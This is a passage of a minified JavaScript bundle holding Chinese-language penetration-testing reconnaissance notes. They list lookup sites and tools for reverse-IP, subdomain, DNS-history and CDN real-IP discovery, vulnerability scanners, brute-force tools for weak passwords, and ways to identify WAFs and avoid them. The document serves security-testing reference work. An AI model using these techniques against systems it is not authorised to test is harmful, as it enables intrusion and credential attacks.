eateElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://api.hackertarget.com/reverseiplookup/?q=<ip>"),"\u3011")))},c.www_robtex_com_\u65C1\u6CE8_\u53CD\u67E5IP={name:"www_robtex_com_\u65C1\u6CE8_\u53CD\u67E5IP",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u80FD\u67E5\u5230\u3010\u56FD\u5916\u7684\u3011\uFF0C\u4F5C\u4E3A\u8865\u5145"),u.a.createElement("li",null,"\u67E5\u3010\u56FD\u5185\u3011\u7684\u4F1A\u6709\u7F3A\u5931")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://www.robtex.com/ip-lookup/<ip>"),"\u3011")))},c.www_zimiclub_com_\u5907\u6848_\u67E5\u8BE2={name:"www_zimiclub_com_\u5907\u6848_\u67E5\u8BE2",tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528],content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u76EE\u524D\u4E3A\u6B62\uFF0C\u67E5 \u5907\u6848 \uFF0C\u6700\u4E3A\u8BE6\u7EC6\u7684"),u.a.createElement("li",null,"\u800C\u4E14\u5E26 \u3010\u6A21\u7CCA\u67E5\u8BE2\u3011\uFF0C\u53EF\u51FA\u591A\u4E2A\u7ED3\u679C")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("www.zimiclub.com/icp/"),"\u3011")))},c.\u624B\u52A8\u67E5\u8BE2={\u67E5\u5907\u6848_\u624B\u52A8\u67E5\u8BE2:{name:"\u67E5\u5907\u6848_\u624B\u52A8\u67E5\u8BE2",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")))},\u5B50\u57DF\u540D_\u624B\u52A8\u67E5\u8BE2:{name:"\u5B50\u57DF\u540D_\u624B\u52A8\u67E5\u8BE2",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5149\u660E\u5F15\u64CE",u.a.createElement("ol",null,u.a.createElement("li",null,"\u624B\u52A8 site:caredaily.com"))),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(g.\u57DF\u540D_\u6536\u96C6)))},\u65C1\u6CE8_\u53CD\u67E5IP_\u624B\u52A8\u67E5\u8BE2:{name:"\u65C1\u6CE8_\u53CD\u67E5IP_\u624B\u52A8\u67E5\u8BE2",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5149\u660E\u641C\u7D22\u5F15\u64CE",u.a.createElement("ol",null,u.a.createElement("li",null,"\u641C IP"))),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(g.\u65C1\u6CE8_\u53CD\u67E5IP)))},\u4EBA\u5DE5\u63A2\u9488_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF:{name:"\u4EBA\u5DE5\u63A2\u9488_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF",desc:u.a.createElement(u.a.Fragment,null,"\u6B64\u5916\uFF0C\u8FD8\u53EF\u4EE5",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6D4B\u8BD5\uFF0C\u540E\u53F0\u5730\u5740"),u.a.createElement("li",null,"\u6D4B\u8BD5\uFF0C\u7AEF\u53E3"))),content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u529F\u80FD\u70B9\u3001\u53C2\u6570\u3001\u76F2\u731C")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5E94\u7528\u529F\u80FD"),u.a.createElement("li",null,"URL\u53C2\u6570"),u.a.createElement("li",null,"\u76F2\u731C\u6D4B\u8BD5")))}},c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2=function(){var i={name:"securitytrails_com_DNS\u89E3\u6790",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://securitytrails.com/domain/\u57DF\u540D/dns"),"\u3011")))},f={name:"securitytrails_com_\u5B50\u57DF\u540D",tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528],content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5230\u76EE\u524D\u4E3A\u6B62\uFF0C\u662F \u7F51\u7AD9\u67E5\u8BE2 \u5185\uFF0C\u6700\u5168\u7684")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://securitytrails.com/list/apex_domain/\u57DF\u540D"),"\u3011")))},P={name:"securitytrails_com_\u65C1\u6CE8_\u53CD\u67E5IP",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://securitytrails.com/list/ip/<ip\u5730\u5740>"),"\u3011")))},D={name:"securitytrails_com_\u8D85\u7EA7Ping",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u867D\u7136\u4E0D\u662F\u4E13\u95E8\u4E3A \u8D85\u7EA7Ping \u505A\u7684\uFF0C\u4F46\u4E5F\u63D0\u4F9B\u4E86 \u76F8\u5173IP\u4FE1\u606F"),u.a.createElement("li",null,"\u53EA\u5217\u4E3E\u4E86 \u76F8\u5173IP \uFF0C\u6CA1\u6709\u7ED9\u51FA \u76F8\u5173\u5730\u5740\u6765\u6E90")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://securitytrails.com/domain/<\u57DF\u540D>/dns"),"\u3011")))};return{DNS\u89E3\u6790:i,\u5B50\u57DF\u540D:f,\u65C1\u6CE8_\u53CD\u67E5IP:P,\u8D85\u7EA7Ping:D}}(),c.chinaz_\u7EFC\u5408\u67E5\u8BE2=function(){var i={name:"chinaz_\u67E5\u5907\u6848",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u4E9B\u65F6\u5019\uFF0C\u5F88\u8BE6\u7EC6")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("icp.chinaz.com/<\u57DF\u540D>"),"\u3011")))},f={name:"chinaz_\u67E5whois"};return{\u67E5\u5907\u6848:i,\u67E5whois:f}}(),c.west_cn_\u7EFC\u5408\u67E5\u8BE2=function(){var i={name:"west_cn_\u67E5\u5907\u6848",desc:u.a.createElement(u.a.Fragment,null,"\u8FD9\u4E2A\uFF0C\u6BD4 \u963F\u91CC\u4E91 \u66F4\u5168"),tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528]},f={name:"west_cn_\u67E5whois",desc:u.a.createElement(u.a.Fragment,null,"\u8FD9\u4E2A\uFF0C\u6BD4 \u963F\u91CC\u4E91 \u66F4\u5168"),tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528]};return{\u67E5\u5907\u6848:i,\u67E5whois:f}}(),c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2=function(){var i={name:"x_threatbook_cn_DNS\u89E3\u6790\u8BB0\u5F55",desc:"\u4E0D\u4E00\u5B9A\u51C6\u786E\uFF0C\u4EC5\u4F9B\u53C2\u8003",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("x.threatbook.cn"),"\u3011"),u.a.createElement("li",null,"\u67E5 \u5386\u53F2\u89E3\u6790\u8BB0\u5F55"),u.a.createElement("li",null,"\u4E0D\u4E00\u5B9A\u51C6\u786E\uFF0C\u4EC5\u4F9B\u53C2\u8003")))},f={name:"x_threatbook_cn_\u65C1\u6CE8_\u53CD\u67E5IP",desc:u.a.createElement(u.a.Fragment,null,"\u8FD8\u884C\u5427\uFF0C\u6BD4\u56FD\u5916\u7684\u5DEE\u70B9\uFF0C\u6BD4\u56FD\u5185\u7684\u5F3A\u70B9"),content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("https://x.threatbook.cn/v5/ip/<ip>"),"\u3011")))};return{DNS\u89E3\u6790\u8BB0\u5F55:i,\u65C1\u6CE8_\u53CD\u67E5IP:f}}(),c.bugscaner_\u7EFC\u5408\u67E5\u8BE2=function(){var i={name:"bugscaner_\u67E5\u5B50\u57DF\u540D",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u65F6\uFF0C\u6709\u4E9B\u57DF\u540D\u67E5\u4E0D\u5230\uFF1B\u4E00\u67E5\u5C31\u5361\u4F4F\u4E86")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("tools.bugscaner.com/subdomain"),"\u3011")))},f={name:"bugscaner_\u67E5CMS",desc:u.a.createElement(u.a.Fragment,null),tags:[p.\u4F18\u5148\u63A8\u8350\u4F7F\u7528],content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("whatweb.bugscaner.com/look"),"\u3011")))};return{\u67E5\u5B50\u57DF\u540D:i,\u67E5CMS:f}}(),c.nmap_\u7EFC\u5408\u5DE5\u5177=function(){var i={name:"nmap_\u57FA\u672C",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},f={name:"nmap_\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u9488\u5BF9",u.a.createElement("ol",null,u.a.createElement("li",null,"\u64CD\u4F5C\u7CFB\u7EDF"),u.a.createElement("li",null,"\u7AEF\u53E3"))))),content:u.a.createElement(u.a.Fragment,null,"\u64CD\u4F5C\u7CFB\u7EDF",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5728 scripts \u76EE\u5F55\u91CC\uFF0Cnse\u6587\u4EF6"))),u.a.createElement("li",null," \u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E00\u3001 --script=vuln \u9ED8\u8BA4nse\u63D2\u4EF6"),u.a.createElement("li",null,"\u4E8C\u3001 vulscan\u3001vulners \u8C03\u7528\u7B2C\u4E09\u65B9\u5E93\u63A2\u9488",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4ECE GitHub \u4E0A\u4E0B\u8F7D\uFF0C\u653E\u5165 scripts \u4E0B\uFF0C\u7528 --script \u6307\u5B9A")))))),"\u7AEF\u53E3",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4ECB\u7ECD"),u.a.createElement("li",null,"\u4F7F\u7528")))};return{\u57FA\u672C:i,\u63A2\u9488:f}}(),c.MsfConsole_\u7EFC\u5408\u5DE5\u5177=function(){var i={name:"MsfConsole_\u5F31\u53E3\u4EE4\u6A21\u5757",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))};return{\u5F31\u53E3\u4EE4\u6A21\u5757:i}}(),c.\u601D\u8DEF\u8D44\u6599=function(){var i={name:"bit4_\u5B50\u57DF\u540D\u601D\u8DEF",content:u.a.createElement(u.a.Fragment,null,"\u601D\u7EF4\u5BFC\u56FE\uFF1A",E("bit4_\u5B50\u57DF\u540D\u601D\u8DEF","https://github.com/bit4woo/domain_hunter/blob/master/doc/xmind.png"))};return{bit4_\u5B50\u57DF\u540D\u601D\u8DEF:i}}(),c.\u7EC4=function(){var i=u.a.createElement(u.a.Fragment,null,"APP\u91CC\uFF0C\u8BBE\u8BA1\u7684\u7F51\u7AD9\uFF0C\u6709\u76F8\u5E94\u7684 \u3010\u68C0\u6D4B\u552F\u4E00\u6027\u3011",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E0D\u7136\uFF0C\u7ECF\u5E38\u7206\u51FA \u3010400 Bad Request\u3011"),u.a.createElement("li",null,"\u5229\u7528\u3010\u626B\u63CF\u5DE5\u5177\u3011\u65F6\uFF0C\u8BBE\u7F6E\u91CC\u9762\uFF0C\u4FEE\u6539\u626B\u63CF\u7684\u3010header\u5934\u90E8\u3011"))),f={name:"http\u534F\u8BAE_\u6293\u5305\u5DE5\u5177",steps:[c.BurpSuite_\u6293\u5305\u5DE5\u5177,c.Charles_\u6293\u5305\u5DE5\u5177,c.Fiddler_\u6293\u5305\u5DE5\u5177,c.\u6293\u5305\u7CBE\u7075_\u6293\u5305\u5DE5\u5177]},P={name:"\u5176\u4ED6\u534F\u8BAE_\u6293\u5305\u5DE5\u5177",steps:[c.WireShark_\u6293\u5305\u5DE5\u5177]};return{\u8D85\u7EA7Ping:{name:"\u8D85\u7EA7ping",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u591A\u4E2A\u5730\u533A\u3001\u5730\u70B9\uFF0Cping\u670D\u52A1\u5668\uFF0C\u7684\u7F51\u7EDC\u6D4B\u8BD5"),u.a.createElement("li",null,"\u6839\u636E \u3010\u81EA\u8EABIP\u5730\u5740\u56DE\u663E\u3011 \uFF0C\u6765\u5224\u65AD \u6709CDN\u8FD8\u662F\u6CA1\u6709"),u.a.createElement("li",null,"\u4E00\u4E2A\u7F51\u7AD9\uFF0C\u51FA\u73B0 2\u4E2AIP \uFF0C\u5C31\u8BF4\u660E \u4F60\u4FE9\u770B\u5230\u7684\u4E1C\u897F \u4E0D\u4E00\u6837")),"\u4F7F\u7528\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u641C\u7D22 \u8D85\u7EA7ping"),u.a.createElement("li",null,"\u9009\u62E9\u3010\u975E\u6D32\u56FD\u5BB6\u3011\uFF0C\u8FDB\u884C ping"),u.a.createElement("li",null,"\u5E38\u7528\u7684\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.asm_ca_com_\u8D85\u7EA7Ping),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.tools_ipip_net_\u8D85\u7EA7Ping),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.\u8D85\u7EA7Ping)))))},"\u3010\u7EC4\u3011CDN\u626B\u5168\u7F51":{name:"CDN \u626B\u5168\u7F51",steps:[c.zmap,c.fuckcdn,c.w8fuckcdn,c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3]},"\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177":{name:"\u5B50\u57DF\u540D\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,"\u53E6\u5916\u601D\u8DEF\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u601D\u8DEF\u8D44\u6599.bit4_\u5B50\u57DF\u540D\u601D\u8DEF))),steps:[c.bugscaner_\u7EFC\u5408\u67E5\u8BE2.\u67E5\u5B50\u57DF\u540D,c.www_dnsgrep_cn_\u5B50\u57DF\u540D,c.\u624B\u52A8\u67E5\u8BE2.\u5B50\u57DF\u540D_\u624B\u52A8\u67E5\u8BE2,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.\u5B50\u57DF\u540D,c.\u601D\u8DEF\u8D44\u6599.bit4_\u5B50\u57DF\u540D\u601D\u8DEF,g.\u57DF\u540D_\u6536\u96C6,c.teemo_\u5168\u81EA\u52A8\u57DF\u540D_\u5B50\u57DF\u540D_\u6536\u96C6\u5DE5\u5177,c.Layer_\u5B50\u57DF\u540D_\u6316\u6398\u673A_\u5DE5\u5177,c.subdomainbrute_\u5B50\u57DF\u540D_\u7206\u7834\u5DE5\u5177,c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177]},\u57DF\u540D:{"\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49":{name:"\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49",steps:[c.\u624B\u52A8\u67E5\u8BE2.\u67E5\u5907\u6848_\u624B\u52A8\u67E5\u8BE2,c.chinaz_\u7EFC\u5408\u67E5\u8BE2.\u67E5\u5907\u6848,c.chinaz_\u7EFC\u5408\u67E5\u8BE2.\u67E5whois,c.west_cn_\u7EFC\u5408\u67E5\u8BE2.\u67E5\u5907\u6848,c.west_cn_\u7EFC\u5408\u67E5\u8BE2.\u67E5whois,c.www_zimiclub_com_\u5907\u6848_\u67E5\u8BE2,{name:"\u4E34\u65F6\u589E\u52A0\u4E00\u4E2A\u3010Whois\u3011\u7684Chrome\u63D2\u4EF6",desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("p",null,"\u63D2\u4EF6\u94FE\u63A5\uFF1Ahttps://chrome.google.com/webstore/detail/ip-whois-flags-chrome-web/kmdfbacgombndnllogoijhnggalgmkon/related"),u.a.createElement("p",null,"\u4FE1\u606F\u6765\u6E90\u5730\u5740\uFF1A\u8D85\u5B9E\u7528\u7684 chrome \u6269\u5C55\u63A8\u8350 - \u4F59\u817E\u9756\u7684\u6587\u7AE0 - \u77E5\u4E4E https://zhuanlan.zhihu.com/p/61605124"))}]},"\u3010\u7EC4\u3011DNS\u89E3\u6790_\u53CA\u5386\u53F2\u8BB0\u5F55":{name:"DNS\u89E3\u6790_\u53CA\u5386\u53F2\u8BB0\u5F55",steps:[c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790\u8BB0\u5F55,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790,c.dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55,c.namelimit_com_DNS\u89E3\u6790\u8BB0\u5F55]}},"\u3010\u7EC4\u3011\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177":{name:"\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177",steps:[c.\u624B\u52A8\u67E5\u8BE2.\u65C1\u6CE8_\u53CD\u67E5IP_\u624B\u52A8\u67E5\u8BE2,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.\u65C1\u6CE8_\u53CD\u67E5IP,c.api_hackertarget_com_\u65C1\u6CE8_\u53CD\u67E5IP_\u76F4\u63A5\u63A5\u53E3,c.www_robtex_com_\u65C1\u6CE8_\u53CD\u67E5IP,c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2.\u65C1\u6CE8_\u53CD\u67E5IP]},"\u3010\u7EC4\u3011\u7B2C\u4E09\u65B9\u63A5\u53E3":{name:"\u7B2C\u4E09\u65B9\u63A5\u53E3",steps:[c.dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55,c.tools_ipip_net_\u8D85\u7EA7Ping,c.crt_sh_\u8BC1\u4E66\u67E5\u8BE2,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790,c.opengps_cn_IP\u5B9A\u4F4D,c.ipinfo_io_IP\u5B9A\u4F4D,c.chaipip_com_IP\u5B9A\u4F4D,c.met_red_IP\u5B9A\u4F4D,c.riskIQ_IP\u5927\u6570\u636E\u753B\u50CF]},"\u3010\u7EC4\u3011\u64CD\u4F5C\u7CFB\u7EDF_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177":{name:"\u64CD\u4F5C\u7CFB\u7EDF_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,"\u3010\u6F0F\u6D1E\u63A2\u9488\u3011\u4E00\u822C\u5206\u4E3A\uFF1A\u5DE5\u5177\u3001\u8F6F\u4EF6\u3001\u4EBA\u5DE5\u3002",u.a.createElement("br",null),u.a.createElement("br",null),"\u7CFB\u7EDF\u6F0F\u6D1E\uFF0C\u4E00\u822C\u7528\u5DE5\u5177"),steps:[c.Goby_\u64CD\u4F5C\u7CFB\u7EDF_\u6F0F\u6D1E\u626B\u63CF,c.nmap_\u7EFC\u5408\u5DE5\u5177.\u63A2\u9488,c.Nessus_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF,c.OpenVas_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF,c.Nexpose_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF]},"\u3010\u7EC4\u3011WEB\u5E94\u7528_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177":{name:"WEB\u5E94\u7528_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026"),steps:[c.xray_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF,c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF,c.appscan_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF,{name:"\u4F01\u4E1A\u516C\u53F8\u5185\u90E8\u4EA7\u54C1",tags:[p.\u4F01\u4E1A\u516C\u53F8\u5185\u90E8],desc:u.a.createElement(u.a.Fragment,null,"\u6682\u65F6\u4E0D\u9700\u8981\u5173\u6CE8")}]},"\u3010\u7EC4\u3011CMS\u63A2\u9488\u5DE5\u5177_\u6846\u67B6":{name:"CMS\u63A2\u9488\u5DE5\u5177_\u6846\u67B6",desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5F53\u6709\u3010\u7279\u5B9A\u5DE5\u5177\u3011\u65F6\uFF0C\u4F18\u5148\u4F7F\u7528\uFF0C\u66F4\u7B80\u4FBF\u66F4\u5FEB\u6377"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u6B64\u65F6\uFF0C\u6BD4\u4F7F\u7528\u3010\u5E38\u7528\u5DE5\u5177\u3011\uFF0C\u6548\u7387\u8981\u9AD8\u5F97\u591A \uFF08\u3010\u5E38\u7528\u5DE5\u5177\u3011\uFF0C(\u65E9\u8BE5) \u626B\u51FA\u6765\u7684\uFF0C\u5DF2\u7ECF\u7206\u51FA\u6765\u4E86\uFF09"))),steps:[c.cmsscan_CMS\u63A2\u9488,c.wpscan_CMS\u63A2\u9488,c.joomscan_CMS\u63A2\u9488,c.drupalscan_CMS\u63A2\u9488,c.yunsee\u4E91\u6089_CMS\u63A2\u9488,c.WhatWeb_CMS\u63A2\u9488,c.Wrappalyzer_CMS\u63A2\u9488,c.bugscaner_\u7EFC\u5408\u67E5\u8BE2.\u67E5CMS]},"\u3010\u7EC4\u3011\u624B\u673A\u6A21\u62DF\u5668":{name:"\u624B\u673A\u6A21\u62DF\u5668",steps:[{name:"\u900D\u9065"},{name:"\u96F7\u7535"},{name:"\u591C\u795E"},{name:"\u6728\u6728"}]},"\u3010\u7EC4\u3011http\u534F\u8BAE_\u6293\u5305\u5DE5\u5177":f,"\u3010\u7EC4\u3011\u5176\u4ED6\u534F\u8BAE_\u6293\u5305\u5DE5\u5177":P,"\u3010\u7EC4\u3011\u603B\u548C_\u6293\u5305\u5DE5\u5177":{name:"\u603B\u548C_\u6293\u5305\u5DE5\u5177",desc:i,steps:[f,P]},"\u3010\u7EC4\u3011\u7AEF\u53E3_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177":{name:"\u7AEF\u53E3_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177",steps:[c.nmap_\u7EFC\u5408\u5DE5\u5177.\u63A2\u9488,c.Nessus_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF,c.masscan_\u7AEF\u53E3\u626B\u63CF]},"\u3010\u7EC4\u3011\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177":{name:"\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177",steps:[c.SnetCracker_\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177,c.MsfConsole_\u7EFC\u5408\u5DE5\u5177.\u5F31\u53E3\u4EE4\u6A21\u5757]}}}();var h=function i(){Object(t.a)(this,i)};h.\u770B\u56FE\u8BC6WAF_\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762=u.a.createElement("div",null,u.a.createElement("div",null,"\u901A\u8FC7\u4E00\u5F20\u3010\u7279\u5F81\u56FE\u7247\u3011\uFF0C\u6765\u8BC6\u522B\u3010WAF\u3011\u3002",u.a.createElement("ol",null,u.a.createElement("li",null,E("\u770B\u56FE\u8BC6WAF-\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762_K3vin`s Blogs-CSDN\u535A\u5BA2_\u5E38\u89C1waf\u9875\u9762","https://blog.csdn.net/weixin_46676743/article/details/112245605")),u.a.createElement("li",null,"\u65B0\u589E\u6761\u76EE\uFF08\u6570\u91CF\u8F83\u591A\uFF09\uFF1A",E("Waf\u8BC6\u522B\u5DE5\u5177\u548C83\u4E2AWaf\u62E6\u622A\u9875\u9762 - \u817E\u8BAF\u4E91\u5F00\u53D1\u8005\u793E\u533A-\u817E\u8BAF\u4E91","https://cloud.tencent.com/developer/article/1872310")))),u.a.createElement("p",null,`
    \u624B\u6D4B\u8FC7\u7A0B\uFF1A
            1.\u9996\u5148\u7528\u3010google\u3011\u53BB\u641C\u4E00\u4E9B  css\u7C7B\u540D\u3001\u5185\u5BB9\u3001title\u6807\u9898 \uFF0C\u4F46\u662F\u6CA1\u7ED3\u679C\u3002
            2.\u7136\u540E\uFF0C\u7528\u3010fofa\u3011\u53BB\u641C\u3002
                    \u53D1\u73B0\u7ED3\u679C\u5F88\u591A\u3002
                    \u7279\u522B\u662F\uFF0C\u53EF\u4EE5\u7528\u3010css\u7C7B\u540D\u3011\u3001\u3010title\u6807\u9898\u3011\uFF0C\u627E\u5230fid\u3002
                            \u3010fid\u3011\u4E0B\uFF0C\u4E00\u4E0B\u5C31\u662F\u4E00\u5927\u7247\u3002
                                    \u6BD4\u5982\u3010fid="HMZM0pv/nABPizwf6SXNDA=="\u3011\u3002
                    \u5F97\u5230\u7684\u4E00\u4E9B\u7279\u5F81\uFF1A
                              1.\u6839\u636E\u56FE\u7247\uFF0C\u7591\u4F3C\u548C\u3010aws\u3011\u7684\u5E03\u5C40\u6709\u70B9\u50CF

                              2.\u6839\u636Efofa\u7ED3\u679C\uFF0C\u6709\u4E2A\u6574\u4F53\u5E03\u5C40\u51E0\u4E4E\u4E00\u81F4\u7684\uFF1A
                                      403 Forbidden
                                              https://im6.ccbft.com/
                                      403 Forbidden by cR
                                              https://doc-w.u.ccb.com/
                                      \u8BF7\u60A8\u767B\u5F55\u7F51\u7AD9\u7BA1\u5BB6
                                              https://139.199.91.35/

                                      \u4ECE\u4E0A\u5206\u6790\uFF0C\u6211\u4E2A\u4EBA\u5F97\u51FA\u7684\u7ED3\u8BBA\uFF0C\u5E94\u8BE5\u662F\u3010\u817E\u8BAF\u4E91\u3011\u7684\u3010waf\u3011\u3002
    `)),h.WAF\u9632\u62A4\u5206\u6790={name:"WAF\u9632\u62A4\u5206\u6790",desc:u.a.createElement(u.a.Fragment,null,F("\u9632\u6B62\u88AB\u5899"),u.a.createElement("br",null),u.a.createElement("br",null),"\u4EC0\u4E48\u662FWAF\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u8BC6\u522BWAF \u5BF9\u4E8E \u5B89\u5168\u6D4B\u8BD5 \u7684\u610F\u4E49",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709WAF\u7684\u8BDD\uFF0C\u4E0D\u8981\u76F4\u63A5\u7528 \u626B\u63CF\u5668 \u5F00\u626B"))),steps:[{name:"\u901A\u8FC7\u4E00\u5F20\u56FE\uFF0C\u6765\u8BC6\u522BWAF",content:u.a.createElement(u.a.Fragment,null,h.\u770B\u56FE\u8BC6WAF_\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762)},{name:"\u5982\u4F55\u5FEB\u901F\u8BC6\u522BWAF",steps:[c.WafW00f_\u8BC6\u522BWAF,{name:"Shodan\u641C\u7D22 